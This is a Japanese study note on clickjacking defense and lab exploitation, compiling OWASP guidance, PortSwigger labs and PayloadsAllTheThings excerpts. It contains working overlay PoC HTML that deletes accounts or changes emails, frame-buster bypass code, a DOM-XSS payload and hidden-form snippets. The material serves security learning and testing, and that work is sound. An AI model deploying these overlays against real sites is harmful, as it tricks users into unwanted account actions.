# [14] クリックジャッキング（Clickjacking / UI Redressing）— 原理・防御・バイパス・PortSwiggerラボ完全ノート

> 本ノートは防御・診断目的の技術解説である（許可された検証・バグバウンティ前提）。攻撃手法の記述はすべて、自分が管理する環境や許可された対象に対する脆弱性検証・PoC作成・防御設計のための知識として記録する。

## 取得状況

| URL | 状態 | 取得方法 | 備考 |
| --- | --- | --- | --- |
| https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html | **full** | GitHub raw（公式ソース）: `raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/Clickjacking_Defense_Cheat_Sheet.md` | 元HTMLは egress proxy が403で遮断。ただしOWASP公式リポジトリのMarkdown原本を全文取得。内容はHTML版と同一（HTML版はこのMarkdownから生成される）。実質full。 |
| https://portswigger.net/web-security/clickjacking | **partial** | 直接取得は egress proxy が403で遮断。二次情報で補完: (a) WebSearchでPortSwigger本文の逐語断片・正典HTMLテンプレートを抽出、(b) GitHubミラー `frank-leitner/portswigger-websecurity-academy`（5ラボのwrite-upと動作するPoC HTMLをscript.py内に逐語収録）、(c) `swisskyrepo/PayloadsAllTheThings/Clickjacking`（onbeforeunload/204/XSSフィルタバイパスの逐語PoC） | portswigger.net本体・web.archive.org・medium・hackmd等はすべて egress policy により403遮断。PortSwiggerラボのPoCテンプレートは frank-leitner ミラーから**逐語**で取得済み。記事本文の散文は検索由来のため一部要約。「〔補足〕」で原典と二次情報を明示。 |

## 要約（3〜10行）

クリックジャッキング（UI redressing）は、攻撃者が用意した「おとり（decoy）」ページの上に、正規サイトを透明な `<iframe>` として重ね、被害者が見えているボタンを押したつもりで、実際には透明iframe内の正規サイトのボタン（メール変更・アカウント削除など）を押させる、インターフェースベースの攻撃である。CSSの `opacity`（透明化）・`z-index`（重なり順）・`position`（位置合わせ）で実現する。CSRFトークンでは防げない（正規サーバから受け取った本物のトークン付きページを被害者自身がクリックするため）。防御の主軸は3つ: (1) HTTPレスポンスヘッダ `Content-Security-Policy: frame-ancestors`（推奨）と旧来の `X-Frame-Options`、(2) セッションCookieの `SameSite=Strict/Lax`（iframe内リクエストにCookieを載せない）、(3) JavaScriptのframe-buster（レガシー向け、バイパス多数）。frame-busterは `<iframe sandbox="allow-forms">`（top-levelナビゲーション無効化）、二重フレーム化、`onbeforeunload`、204 No Content フラッシュ、iframe内JS無効化などでバイパスされる。PortSwiggerには基本CSRF保護つき・URLパラメータ事前入力・frame-busterバイパス・DOM XSS連鎖・多段（multistep）の5ラボがある。

---

## 詳細ノート

# ============================================================
# パートA: OWASP Clickjacking Defense Cheat Sheet（出典: OWASP公式 / URL1）
# ============================================================

### A-0. はじめに（Introduction）（出典: URL1）

このチートシートは、開発者が **Clickjacking（別名 UI redress attack / UIリドレス攻撃）** に対して防御する方法のガイダンスを提供する。攻撃防御には主に3つのメカニズムがある:

- **ページがフレームに読み込まれること自体をブラウザに拒否させる**: `X-Frame-Options` または `Content Security Policy (frame-ancestors)` HTTPヘッダを使う。
- **フレーム内で読み込まれたときにセッションCookieを含めない**: `SameSite` Cookie属性を使う。
- **フレーム内での読み込みを阻止するJavaScript（frame-buster）をページに実装する**。

これらは互いに独立しており、可能なら **多層防御（defense in depth）** のため複数を実装すべき。

### A-1. CSP frame-ancestors ディレクティブによる防御（出典: URL1）

`frame-ancestors` ディレクティブは、`Content-Security-Policy` HTTPレスポンスヘッダ内で使い、ブラウザがそのページを `<frame>` / `<iframe>` にレンダリングしてよいかを指示する。自サイトのコンテンツが他サイトに埋め込まれないよう保証することでクリックジャッキングを防げる。`frame-ancestors` は通常のCSPセマンティクスで複数ドメインを許可できる。

#### コード/コマンド（原文のまま逐語） — CSP frame-ancestors の代表例

```
Content-Security-Policy: frame-ancestors 'none';
```
→ いかなるドメインからのフレーム化も禁止。フレーム化の具体的な必要性が特定されない限り、**この設定が推奨**。

```
Content-Security-Policy: frame-ancestors 'self';
```
→ 現在のサイトのみがコンテンツをフレーム化できる。

```
Content-Security-Policy: frame-ancestors 'self' *.somesite.com https://myfriend.site.com;
```
→ 現在のサイト、`somesite.com` の任意ページ（任意プロトコル）、および `myfriend.site.com`（HTTPSのデフォルトポート443のみ）を許可。

注意: `self` と `none` の周囲の**シングルクォートは必須**だが、その他のソース式にはクォートを付けない。

参考: `https://w3c.github.io/webappsec-csp/#directive-frame-ancestors` / MDNの frame-ancestors ページ。

**Limitations（制限）— X-Frame-Options takes priority:** CSP仕様の "Relation to X-Frame-Options" 節によれば「*リソースが frame-ancestors ディレクティブを含み disposition が "enforce" のポリシーで配信された場合、X-Frame-Options ヘッダは無視されなければならない（MUST be ignored）*」。ただし古いブラウザ（例: Chrome 40, Firefox 35）はこの要件を無視し、代わりに X-Frame-Options に従った。

### A-2. X-Frame-Options レスポンスヘッダによる防御（出典: URL1）

`X-Frame-Options` HTTPレスポンスヘッダで、ページを `<frame>`/`<iframe>` にレンダリングしてよいかを指示する。HTMLコンテンツを含む**すべてのレスポンス**に設定する。取りうる値は "DENY"・"SAMEORIGIN"・"ALLOW-FROM uri"。

**X-Frame-Options ヘッダの3つの値:**

- **DENY**: いかなるドメインからのフレーム化も禁止。フレーム化の必要が特定されない限り "DENY" が推奨。
- **SAMEORIGIN**: 現在のサイトのみフレーム化を許可。
- **ALLOW-FROM uri**: 指定した 'uri' にこのページのフレーム化を許可（例: `ALLOW-FROM http://www.example.com`）。
    - これは**廃止された（obsolete）**ディレクティブで、現代のブラウザではもはや動作しない。
    - ブラウザが未対応の場合 **fail open（防御なしで通る）** になるため下記の制限に注意。
    - 他のブラウザは代わりに新しい CSP frame-ancestors ディレクティブに対応。両方対応するものも少数ある。

**Implementation（実装）:** 保護したい各ページに `X-Frame-Options` HTTPレスポンスヘッダを追加する。手動で全ページに付ける方法のほか、フィルタで全ページに自動付与する、あるいはWAF/Web・アプリケーションサーバレベルで付与する方法が簡潔。

**Common Defense Mistakes（よくある防御ミス）:** X-Frame-Options ディレクティブを適用しようとする **meta タグは動作しない**。例えば `<meta http-equiv="X-Frame-Options" content="deny">` は**動作しない**。必ずHTTPレスポンスヘッダとして適用すること。同じ規則がCSPの `frame-ancestors` にも当てはまり、`<meta>` タグではなくHTTPレスポンスヘッダとして設定しなければならない。

**Limitations（制限）:**

- **ページ単位のポリシー指定**: ポリシーを全ページに指定する必要があり、展開が煩雑。サイト全体に（例: ログイン時に）強制できれば導入が楽になる。
- **マルチドメインサイトの問題**: フレーム化を許可するドメインのリストを管理者が指定できない。許可ドメインの列挙は危険だが、複数ホスト名を使わざるを得ない場合もある。
- **ALLOW-FROM のブラウザ非対応**: ALLOW-FROM は廃止され現代ブラウザで動かない。ALLOW-FROM に依存すると、ブラウザが未対応の場合クリックジャッキング防御が**まったく無くなる**ので要注意。
- **複数指定不可**: 現在のサイトと第三者サイトの両方に同一レスポンスのフレーム化を許可する方法がない。ブラウザは X-Frame-Options を1つ、値も1つしか尊重しない。
- **ネストされたフレームは SAMEORIGIN / ALLOW-FROM で動かない**: `http://framed.invalid/child` フレームが読み込まれない状況がある。ALLOW-FROM はトップレベルのブラウジングコンテキストに適用され、直接の親には適用されないため。解決策は親・子両方でALLOW-FROMを使うこと（ただし `//framed.invalid/parent` がトップレベル文書として読み込まれると子フレームの読み込みを妨げる）。
- **X-Frame-Options は非推奨（Deprecated）**: 主要ブラウザは対応しているが、CSP Level 2 の frame-ancestors ディレクティブに取って代わられ廃止扱い。
- **プロキシ**: Webプロキシはヘッダの追加・除去で悪名高い。プロキシが X-Frame-Options を剥がすとサイトはフレーム化保護を失う。

### A-3. SameSite Cookie による防御（出典: URL1）

`SameSite` Cookie属性（RFC 6265bis 5.3.7）は主に **CSRF** 防御が目的だが、クリックジャッキングに対する保護も提供できる。`SameSite` 属性が `strict` か `lax` のCookieは、`<iframe>` 内のページへのリクエストに含まれない。つまりセッションCookieに `SameSite` が付いていれば、**被害者が認証済みであることを要件とするクリックジャッキング攻撃は成立しない**（Cookieが送られないため）。

**Limitations（制限）:**

- クリックジャッキング攻撃が**ユーザ認証を必要としない**場合、この属性は何の保護も与えない。
- `SameSite` はほとんどの現代ブラウザで対応されるが、未対応ブラウザのユーザも一部（2020年11月時点で約6%）残る。
- この属性は**多層防御（defense-in-depth）の一部**とみなすべきで、クリックジャッキングに対する唯一の保護手段として依存してはならない。

### A-4. レガシーブラウザ向け「今できる最善」のフレーム破り（frame breaking）スクリプト（出典: URL1）

各ページに「frame-breaker」スクリプトを含める。X-Frame-Options 未対応のレガシーブラウザでもフレーム化を防げる。document の HEAD 要素に以下を追加する。

まず style 要素自体にIDを付ける:

#### コード/コマンド（原文のまま逐語）

```html
<style id="antiClickjack">
    body{display:none !important;}
</style>
```

その直後にスクリプトで、そのstyleをIDで削除する:

```html
<script type="text/javascript">
    if (self === top) {
        var antiClickjack = document.getElementById("antiClickjack");
        antiClickjack.parentNode.removeChild(antiClickjack);
    } else {
        top.location = self.location;
    }
</script>
```

このやり方なら全てを document HEAD に置け、APIで必要なメソッド/タグライブラリは1つで済む。〔補足（一般知識）: この「デフォルトで body を display:none にし、フレーム化されていない（self===top）ときだけ表示を復活させる」パターンは、JSが無効だと単に非表示のままになるが、少なくとも「透明フレームでのクリック誘導」は成立しにくくなる。素朴な `if(top!=self) top.location=self.location` 型より堅い。〕

### A-5. window.confirm() による保護（出典: URL1）

X-Frame-Options や frame-breaking スクリプトの方がフェイルセーフだが、**コンテンツがフレーム化可能でなければならない**シナリオでは、`window.confirm()` を使い、実行しようとしている操作をユーザに知らせることでクリックジャッキングを緩和できる。`window.confirm()` を呼ぶと、**フレーム化できない**ポップアップが表示される。iframeが親と異なるドメインなら、ダイアログは `window.confirm()` の発生元ドメインを表示する。ブラウザがダイアログの発生元を表示することでクリックジャッキングを緩和する。

#### コード/コマンド（原文のまま逐語）

```html
<script type="text/javascript">
    var action_confirm = window.confirm("Are you sure you want to delete your youtube account?")
    if (action_confirm) {
        //... Perform action
    } else {
        //... The user does not want to perform the requested action.`
    }
</script>
```

### A-6. 安全でない・動作しないスクリプト「使ってはいけない（DO NOT USE）」（出典: URL1）

以下は**推奨されない**クリックジャッキング防御の例:

#### コード/コマンド（原文のまま逐語）

```html
<script>if (top!=self) top.location.href=self.location.href</script>
```

この単純なframe breakingスクリプトは、親ウィンドウに現フレームのURLを読み込ませてフレーム/iframeへの組み込みを防ごうとする。しかしこの種のスクリプトを破る方法が複数公開されている。以下に代表例を挙げる。

**(1) Double Framing（二重フレーム化）:** 一部のframe破り手法は `parent.location` へ値を代入してページ遷移する。被害ページが単一ページにフレーム化されているならうまくいく。しかし攻撃者が被害者を**フレームの中のさらにフレーム（二重フレーム）**に包むと、`parent.location` へのアクセスが全主要ブラウザで **descendant frame navigation policy（子孫フレームのナビゲーションポリシー）** によりセキュリティ違反となり、この対抗ナビゲーションが無効化される。

被害側のframe破りコード（逐語）:
```javascript
if(top.location != self.location) {
    parent.location = self.location;
}
```
攻撃者のトップフレーム（逐語）:
```html
<iframe src="attacker2.html">
```
攻撃者のサブフレーム（逐語）:
```html
<iframe src="http://www.victim.com">
```

**(2) The onBeforeUnload Event:** ユーザはフレーム化されたページが発したナビゲーション要求を手動でキャンセルできる。これを悪用するため、フレーム化する側のページが `onBeforeUnload` ハンドラを登録する。フレームページがナビゲーションで unload されそうになるたびに呼ばれ、ハンドラの戻り値の文字列がユーザに表示されるプロンプトの一部になる。例えばPayPalをフレーム化したい攻撃者は「Do you want to exit PayPal?」を返すunloadハンドラを登録する。この文字列が表示されるとユーザはナビゲーションをキャンセルしがちで、PayPalのframe破りは無効化される。攻撃者はトップページに次のコードでunloadイベントを登録する:

```html
<script>
    window.onbeforeunload = function(){
        return "Asking the user nicely";
    }
</script>

<iframe src="http://www.paypal.com">
```
PayPalのframe破りコードが `BeforeUnload` イベントを発火させ、この関数を起動、ユーザにナビゲーションのキャンセルを促す。

**(3) No-Content Flushing:** 前述の攻撃はユーザ操作が必要だが、同じ攻撃を**ユーザに促さず**行える。現代ブラウザでは、"*204 - No Content*" を返すサイトへナビゲーション要求を繰り返し送ることで、`onBeforeUnload` ハンドラ内で incoming なナビゲーション要求を自動キャンセルできる。No Contentサイトへの遷移は事実上NOPだが、リクエストパイプラインをフラッシュして元のナビゲーション要求をキャンセルする。サンプルコード（逐語）:

```javascript
var preventbust = 0
window.onbeforeunload = function() { killbust++ }
setInterval( function() {
    if(killbust > 0){
    killbust = 2;
    window.top.location = 'http://nocontent204.com'
    }
}, 1);
```
```html
<iframe src="http://www.victim.com">
```
〔補足（一般知識）: 原文のこの断片は変数名が `preventbust`/`killbust` と食い違っており、そのまま動くコードではない（OWASP原文ママ）。意図は「onbeforeunloadでカウンタを立て、1msごとに204ページへ飛ばしてframe破りナビゲーションをフラッシュ・無効化する」こと。整合の取れた版は後述のPayloadsAllTheThings節を参照。〕

**(4) Restricted zones（JavaScript制限）:** ほとんどのframe破りは、フレーム化されたページ内のJavaScriptがフレーム化を検知して自身をbust-outすることに依存する。サブフレームのコンテキストでJSが無効なら、frame破りコードは走らない。サブフレームでJSを制限する方法が複数ある:

Chrome の場合（逐語）:
```html
<iframe src="http://www.victim.com" sandbox></iframe>
```
Firefox の場合: 親ページで [designMode](https://developer.mozilla.org/en-US/docs/Web/API/Document/designMode) を有効化する。designModeは現代ブラウザでも対応されるが、クリックジャッキング攻撃ベクトルとしての有効性は現行バージョンでは異なりうる。
```javascript
document.designMode = "on";
```

# ============================================================
# パートB: PortSwigger Web Security Academy「Clickjacking」（出典: URL2）
# ※ portswigger.net本体は egress proxy に遮断されたため、
#   本文散文はWebSearch由来、HTMLテンプレートは frank-leitner ミラー等から逐語取得。
# ============================================================

### B-0. クリックジャッキングとは / CSRFとの違い（出典: URL2 記事本文, WebSearch経由）

クリックジャッキング（UI redressing）とは、ユーザが**おとり（decoy）サイト**の何かをクリックしているつもりで、実際には隠された別サイト上の「操作可能なコンテンツ」をクリックさせられるインターフェースベース攻撃である。手口は、ボタンや隠しリンクを含む「見えない・操作可能なWebページ（1枚または複数）」を iframe 内に取り込み、その iframe をユーザが見ているおとりコンテンツの**上に重ねる**こと。

〔逐語断片（PortSwigger本文, WebSearch経由）〕:
> "Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website."

**CSRFとの違い（重要）:** クリックジャッキングは、ユーザがボタンクリックなど**能動的な操作を実際に行う**点でCSRFと異なる。CSRFはユーザの知覚や入力なしにリクエスト全体を偽造することに依存する。さらに、**クリックジャッキングはCSRFトークンでは緩和できない**。ターゲットのセッションは正規サイトから読み込まれたコンテンツで確立され、すべてのリクエストがオンドメイン（正規ドメイン上）で発生するため、正規のCSRFトークンが本物のまま送られてしまう。

〔逐語断片（PortSwigger本文, WebSearch経由）〕:
> "Clickjacking attacks are not mitigated by the CSRF token as a target session is established with content loaded from an authentic website and with all requests happening on-domain."

### B-1. 基本的なクリックジャッキング攻撃の構築（出典: URL2）

クリックジャッキングはCSSでレイヤーを作成・操作する。攻撃者はターゲットサイトを自分が管理するページ内の iframe に埋め込み、iframe の `opacity`（不透明度）を下げてコンテンツを見えなくする。`z-index` を攻撃者の可視要素より高くして iframe がクリックを受け取るようにし、`position` でおとりのボタン文言を正規ボタンの真上に重ねる。

**正典（canonical）HTML PoC テンプレート（PortSwigger記事, WebSearch経由・逐語）:**

#### コード/コマンド（原文のまま逐語） — PortSwigger 記事テンプレート

```html
<style>
  iframe {
    position:relative;
    width:$width_value;
    height: $height_value;
    opacity: $opacity;
    z-index: 2;
  }
  div {
    position:absolute;
    top:$top_value;
    left:$side_value;
    z-index: 1;
  }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

- `$width_value` / `$height_value`: iframe が十分レンダリングされる寸法（例: 700px）。
- `$opacity`: **最初は 0.1** にして iframe の操作対象と `div` の位置を目視で合わせ、位置値（`$top_value`/`$side_value`）を調整する。**提出（本番）攻撃では 0.0001** にして iframe をほぼ不可視にする。
- `z-index`: iframe を 2（上）、可視 `div` を 1（下）にし、クリックは最前面の iframe が受け取る。
- 位置合わせのポイント: 可視 `div`（"Test me" / "Click me"）が、iframe内の押させたいボタン（Update email / Delete account 等）の真上に来るよう `top`/`left` を微調整。

〔逐語断片（PortSwigger本文, WebSearch経由）〕:
> "Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work."

### B-2. Burp Clickbandit ツール（出典: URL2 / PortSwigger Research）

クリックジャッキングをテストする際、PortSwiggerは **Burp の Clickbandit ツール**の使用を推奨する。ブラウザでフレーム化可能なページ上の目的操作を実行するだけで、適切なクリックジャッキングオーバーレイを含むHTMLファイルを生成し、HTMLやCSSを一行も書かずに数秒で対話的なPoCを作れる。〔補足（一般知識）: Clickbandit は JavaScript ベースのPoCジェネレータで、「record」モードで正規サイト上を操作 → 「finish」でオーバーレイHTMLを出力する。〕

### B-3. プレフィル（事前入力）されたフォーム入力を使う（出典: URL2）

一部のWebサイトはGETパラメータでフォーム入力を submit 前に**事前入力（prepopulate）**できる。ターゲットURLを改変して攻撃者の任意値を入れ、透明な「submit」ボタンをおとりサイトに重ねられる。

〔逐語断片（PortSwigger本文, WebSearch経由）〕:
> "Some websites permit prepopulation of form inputs using GET parameters prior to submission... the target URL can be modified to incorporate values of the attacker's choosing with the transparent 'submit' button overlaid on the decoy site."

〔補足（frank-leitner write-up の教訓）: 同一ドメインでない iframe の中身はJavaScript（`getElementsByName` 等）から**触れない**（同一オリジンポリシー）。だからJSでフォームを埋めようとするのは行き止まり。正しい道は「サイトがURLパラメータでフォームを事前入力できる」機能を使い、iframe の src に `?email=mail@evil.me` を付けることでロード時にフィールドを埋めること。〕

### B-4. frame busting スクリプトを使う正規サイトへの攻撃（frame-buster バイパス）（出典: URL2）

クライアント側保護としてよく使われるのが frame busting / frame breaking スクリプト（自ウィンドウが最上位でなければページ内容を差し替える等）。しかし攻撃者は **HTML5 iframe の `sandbox` 属性**で回避できる。`allow-forms` と `allow-scripts` の値はそれぞれフォーム/スクリプトを許可するが、**トップレベルナビゲーションは無効化**される。これによりframe破りの挙動（`top.location = self.location` 等）が阻止され、ターゲットサイトの機能（フォーム送信）は許可される。

〔逐語断片（PortSwigger本文, WebSearch経由）〕:
> "An effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute. Both the allow-forms and allow-scripts values permit the specified actions within the iframe but top-level navigation is disabled, which inhibits frame busting behaviours while allowing functionality within the targeted site."

要点: `sandbox="allow-forms"` は「フォーム送信は許すが top-level navigation は禁止」。frame-busterスクリプトが走るのは iframe に script 権限（`allow-scripts`）を与えたときだけなので、**`allow-scripts` を付けなければ**frame破りコードそのものが動かない。ただしターゲットページの他のスクリプトも全部止まるため、frame破りは無効化できても機能が壊れる可能性がある（トレードオフ）。

### B-5. クリックジャッキングと DOM-based XSS の連鎖（出典: URL2）

クリックジャッキング単体は「被害者の1クリックで起こせる操作」に限られるが、**DOMベースのXSS sink**と連鎖させると、その1クリックがアカウント操作ではなく、被害者の認証済みセッション内での**任意JavaScript実行**を引き起こす。XSSペイロードの別配送手段は不要で、クリックジャッキングiframe自体が配送手段になる。手順の骨子: (1) URLパラメータで事前入力できるフィードバックフォーム等にXSSペイロードを注入 → (2) そのペイロード入りURLを iframe の src にする → (3) 被害者がおとりをクリック → iframe内の送信ボタンが押され → DOM XSS が発火。

〔逐語断片（PortSwigger本文, WebSearch経由）〕:
> "The XSS exploit is then combined with the iframe target URL so that the user clicks on the button or link and consequently executes the DOM XSS attack."

### B-6. 多段（Multistep）クリックジャッキング（出典: URL2）

操作に複数ステップ（例: 「削除」→確認ダイアログで「confirm」）がある場合、攻撃者はおとり `div` を複数用意し、それぞれを各ステップのボタンの上に重ねる。ラボの被害者は「Click me first」「Click me next」のような順序指示に従うため、複数の透明ボタンを順にクリックさせられる。確認ダイアログ（window.confirm的な追加確認）は、この多段クリック誘導でバイパスされうる。

---

## PortSwigger 5ラボ 手順とHTML PoCテンプレート（逐語）

> 以下のPoC HTMLは GitHubミラー `frank-leitner/portswigger-websecurity-academy` の各 `script.py` 内 `responseBody` から**逐語**で抜き出した、実際に各ラボを解く動作するテンプレートである。exploit server の応答ヘッダは全ラボ共通で下記。

**Exploit server 共通レスポンスヘッダ（逐語）:**
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
```
配送フロー（script.py 共通）: (1) ラボトップHTMLから `id="exploit-link"` の href（exploit server URL）を取得 → (2) exploit server に `responseFile=/exploit`, `responseHead`, `responseBody`, `formAction=STORE` をPOSTして保存（`STORE`） → (3) `GET {exploit_server}/deliver-to-victim`（302が返れば成功） → (4) ラボトップに `Congratulations, you solved the lab!` が出れば解決。

### ラボ1: Basic clickjacking with CSRF token protection（APPRENTICE）
Lab-Link: https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected
- 説明: アカウント削除機能がCSRFトークンで保護されている。被害者は `click` の語を含むものは何でもクリックする。認証情報 `wiener:peter`。
- ゴール: アカウントページをフレーム化し、ユーザにアカウントを削除させる悪性HTMLを作る。
- 分析（write-up逐語要旨）: Deleteボタンは `/my-account/delete` にPOSTする単純なフォームで、本文にCSRFトークンを含む。トークンを知らないので完全な偽フォームは作れない。回避策は2ページを重ねること: (a) クリックを誘う任意コンテンツのページ、(b) その前面に**不可視**の脆弱ページ。ユーザが自分のサイトをクリックすると、ブラウザは最前面（脆弱ページ）へのクリックと解釈する。脆弱ページは本物のサーバから来ており正規トークンを含むため、CSRF保護は無意味。位置調整時は opacity=0.5 で見ながら合わせ、最後に `0.0000` にすると真っ白になる。

#### コード/コマンド（原文のまま逐語） — ラボ1 responseBody
```html
<head>
    <style>
        #vulnerable_page{
            position:relative;
            width:1000px;
            height:800px;
            opacity:0.0000;
            z-index:2;
            }
        #evil_page{
            position:absolute;
            top:515px;
            left:50px;
            z-index:1;
            }
    </style>
</head>
<body>
    <div id="evil_page">
    Click me!!!
    </div>
    <iframe id="vulnerable_page" src="HOST/my-account">
    </iframe>
</body>
```
（`HOST` はラボの実URL。iframe src は `{host}/my-account`。）

### ラボ2: Clickjacking with form input data prefilled from a URL parameter（APPRENTICE）
Lab-Link: https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input
- 説明: メール変更機能がCSRFトークンで保護。被害者は `click` を含むものをクリック。`wiener:peter`。
- ゴール: アカウントページをフレーム化し、ユーザにメールアドレスを変更させる。
- 要点: JSでiframe内フォームを埋めるのは別ドメインなので不可（同一オリジンポリシー）。正解は、サイトがURL引数でフォームを事前入力できる機能を使い、iframe src に `?email=mail@evil.me` を付けること。

#### コード/コマンド（原文のまま逐語） — ラボ2 responseBody
```html
<head>
    <style>
        #victim{
            position:relative;
            width:1000px;
            height:800px;
            opacity:0.0000;
            z-index:2;
            }
        #evil_page{
            position:absolute;
            top:465px;
            left:65px;
            z-index:1;
            }
    </style>
</head>
<body>
    <div id="evil_page">
    Click me!!!
    </div>
    <iframe id="victim" src="HOST/my-account?email=mail@evil.me">
    </iframe>
</body>
```

### ラボ3: Clickjacking with a frame buster script（APPRENTICE）
Lab-Link: https://portswigger.net/web-security/clickjacking/lab-frame-buster-script
- 説明: アプリはframe-bustingスクリプトでクリックジャッキング対策済み。被害者は `click` を含むものをクリック。`wiener:peter`。
- ゴール: アカウントページをフレーム化し、メール変更させる。
- 要点: frame-busterは「自ウィンドウ===最上位ウィンドウ」でなければページ内容を単純なテキストに差し替える。バイパスは iframe に `sandbox="allow-forms"` を付けること。`allow-forms` でフォーム送信は許可しつつ、`allow-scripts` を**与えない**ことでframe-busterスクリプト自体が走らなくなる（top-levelナビゲーションも無効化される）。ラボ2との差分は iframe タグに `sandbox="allow-forms"` を追加した点のみ。

#### コード/コマンド（原文のまま逐語） — ラボ3 responseBody
```html
<head>
    <style>
        #victim{
            position:relative;
            width:1000px;
            height:800px;
            opacity:0.0000;
            z-index:2;
            }
        #evil_page{
            position:absolute;
            top:465px;
            left:65px;
            z-index:1;
            }
    </style>
</head>
<body>
    <div id="evil_page">
    Click me!!!
    </div>
    <iframe id="victim" sandbox="allow-forms" src="HOST/my-account?email=mail@evil.me">
    </iframe>
</body>
```

### ラボ4: Exploiting clickjacking vulnerability to trigger DOM-based XSS（PRACTITIONER）
Lab-Link: https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss
- 説明: クリックで発火するXSS脆弱性がある。クリックジャッキング対策の情報なし。被害者は `click` を含むものをクリック。
- ゴール: ページをフレーム化し `print()` 関数を呼ばせる。
- 分析（write-up逐語要旨）: 入力点は「Submit feedback」フォームと各記事の「comments」。Burpで両方フレーム化可能と確認。feedbackフォームはURL引数で事前入力可能（commentsは不可）。`value` コンテキストからの脱出（`" id=x"`等）は `&quot;` に正しくエンコードされ失敗。しかしname項目がクライアント側で `<span>` 直上にそのまま挿入され、タグコンテキスト外なので任意HTMLを注入できる。ただし新規 `<script>` ブロックはページ解析後に追加されても実行されない。回避策は、解析され直すHTML（埋め込みスクリプト付き）を注入すること。例: 無効ソースの `<img>` と `onerror` スクリプト。

#### コード/コマンド（原文のまま逐語） — ラボ4 の XSSペイロード
```HTML
<img src=x onerror=print()>
```
（このペイロードを name 項目にURLパラメータで事前入力し、iframe src に載せる。opacityを `0.000` にして Store → Deliver exploit to victim。）

### ラボ5: Multistep clickjacking（PRACTITIONER）
Lab-Link: https://portswigger.net/web-security/clickjacking/lab-multistep
- 説明: アカウント削除機能がCSRFトークンで保護。さらにクリックジャッキング対策の**追加確認ダイアログ**あり。被害者は `click` を含むものをクリックし、「Click me first」「Click me next」のような順序指示に従う。`wiener:peter`。
- ゴール: ページをフレーム化し、delete と confirm 両ボタンのおとりを用意し、ユーザにアカウントを削除させる。
- 要点: (1) フォーム自体を改変して `confirmed` 値を足す手は使えない（フォームは触れない）。(2) CSRFトークンにより iframe 内で直接 delete リクエストを発行できない。さらに `/my-account/delete` はGET不可なので iframe に直接ロードもできない。→ ユーザに**2回クリック**させる。おとり `div` を2枚（`Click me first!` と `Click me next!`）作り、1枚目を Delete account ボタン、2枚目を確認ボタンの上に重ねる。

#### コード/コマンド（原文のまま逐語） — ラボ5 responseBody
```html
<head>
    <style>
        #victim{
            position:relative;
            width:1000px;
            height:800px;
            opacity:0.0000;
            z-index:2;
            }
        #evil_page1{
            position:absolute;
            top:515px;
            left:65px;
            z-index:1;
            }
        #evil_page2{
            position:absolute;
            top:310px;
            left:200px;
            z-index:1;
            }
    </style>
</head>
<body>
    <div id="evil_page1">
    Click me first!
    </div>
    <div id="evil_page2">
    Click me next!
    </div>
    <iframe id="victim" src="HOST/my-account">
    </iframe>
</body>
```

# ============================================================
# パートC: PayloadsAllTheThings — Clickjacking（出典: swisskyrepo/PayloadsAllTheThings 公式GitHub, 補完資料）
# ※ 担当2URLの補完。frame-buster バイパスとフィルタ悪用の逐語PoCが有用なため収録。
# ============================================================

### C-0. 定義（逐語要旨）
クリックジャッキングは、悪性サイトがユーザに「知覚しているものと違うもの」をクリックさせ、知らぬ間・同意なしに意図しない操作（パスワード入力、「Delete my account」クリック、投稿へのいいね・削除・コメント等、正規サイトで通常ユーザができる全操作）を行わせるWebセキュリティ脆弱性。

### C-1. 手法（Methodology）

**UI Redressing:** 透明UI要素（通常 `<div>`、`opacity: 0;`）を正規サイトの上に重ね、`position: absolute; top: 0; left: 0;` で全ビューポートを覆う。可視インターフェースを操作しているつもりのユーザに、隠し要素を操作させる。
```html
<div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">
  <a href="malicious-link">Click me</a>
</div>
```

**Invisible Frames（不可視フレーム）:** iframe を `opacity: 0; height: 0; width: 0; border: none;` で不可視化。
```html
<iframe src="malicious-site" style="opacity: 0; height: 0; width: 0; border: none;"></iframe>
```

**Button/Form Hijacking:** 可視ボタンの上に不可視オーバーレイを重ね、クリックで隠しフォームを送信させる。
```html
<button onclick="submitForm()">Click me</button>
<form action="legitimate-site" method="POST" id="hidden-form">
  <!-- Hidden form fields -->
</form>
<script>
  function submitForm() {
    document.getElementById('hidden-form').submit();
  }
</script>
```

**Execution Methods（隠しフォーム）:**
```html
<form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
<input type="hidden" name="username" value="attacker">
<input type="hidden" name="action" value="transfer-funds">
</form>
```

### C-2. 防御策（逐語コード）

**X-Frame-Options（Apache）:**
```apache
Header always append X-Frame-Options SAMEORIGIN
```

**CSP（metaタグ例）:**
```html
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self';">
```
〔補足（一般知識）: PayloadsAllTheThingsはCSPのmeta例を挙げるが、**OWASP（パートA-2）は「frame-ancestorsはmetaタグでは効かず、HTTPレスポンスヘッダにすべき」**と明記している。実運用ではmetaではなくレスポンスヘッダで設定すること。〕

**JavaScript無効化系（frame破りが依存するJSを殺す3手法）:**
- IEの `security="restricted"` 属性（IE6以降）: JS・ActiveX・他サイトへのリダイレクトを無効化。
```html
<iframe src="http://target site" security="restricted"></iframe>
```
- HTML5 `sandbox` 属性:
```html
<iframe src="http://target site" sandbox></iframe>
```

### C-3. OnBeforeUnload Event（整合の取れた逐語PoC）

`onBeforeUnload` は、frame破りコードがiframeを壊してURLをページ全体に読み込もうとするときに呼ばれる。ハンドラの戻り文字列がユーザに「離脱するか」を確認するプロンプトとして表示され、ユーザがキャンセルするとframe破りが無効化される。

ユーザ操作を要する版（逐語）:
```html
<h1>www.fictitious.site</h1>
<script>
    window.onbeforeunload = function()
    {
        return " Do you want to leave fictitious.site?";
    }
</script>
<iframe src="http://target site">
```

ユーザ操作なしで自動化する版 — 204 No Content でフラッシュ（逐語）:

204 を返すページ（PHP, 逐語）:
```php
<?php
